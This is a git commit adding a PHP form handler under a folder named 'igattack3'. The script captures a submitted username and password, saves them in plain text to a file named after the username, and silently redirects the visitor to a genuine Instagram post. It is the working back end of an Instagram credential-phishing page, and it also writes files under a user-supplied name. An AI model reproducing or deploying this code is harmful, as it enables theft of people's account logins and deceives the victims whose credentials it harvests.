3dac0b6a213582aa7905c4b21d622e9912bd6577
Darsh Chaurasia <43368969+darshchaurasia@users.noreply.github.com>
2022-12-24 14:52:22 -0700

    Add files via upload

---
+++ igattack3/form.php
@@ -0,0 +1,13 @@
+<?php
+$get = @$_POST['go'];
+$username = strip_tags(@$_POST['username']);
+$password = strip_tags(@$_POST['password']);
+if($get) {
+    $hello = "Username: ".$username." and "."Password: ".$password;
+    $fp = fopen($username, 'w');
+fwrite($fp, $hello);
+fclose($fp);
+echo "<meta http-equiv=\"refresh\" content=\"0; url=https://www.instagram.com/p/B0uzz-wB8Vl/\">";	
+}
+
+?>
